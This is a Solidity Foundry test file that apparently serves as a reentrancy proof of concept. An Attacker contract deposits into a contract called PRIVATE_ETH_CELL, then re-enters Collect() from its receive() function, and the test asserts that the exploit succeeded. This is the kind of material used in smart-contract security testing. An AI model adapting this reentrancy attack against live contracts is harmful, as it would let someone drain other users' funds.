
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PRIVATE_ETH_CELL, LogFile} from "../src/PRIVATE_ETH_CELL.sol";

contract TestReentrancyPRIVATE_ETH_CELL is Test {

    PRIVATE_ETH_CELL public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        LogFile log = new LogFile();
        _contractUnderTest = new PRIVATE_ETH_CELL();
        _contractUnderTest.SetMinSum(1 ether);
        _contractUnderTest.SetLogFile(address(log));
        _contractUnderTest.Initialized();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 1 ether && attackVal < type(uint128).max);
        
        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PRIVATE_ETH_CELL public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = PRIVATE_ETH_CELL(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        storedAttackVal = val;

        _victim.Collect(val);

        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            _victim.Collect(storedAttackVal);
        }
        revert("Exploit revert");
    }
}
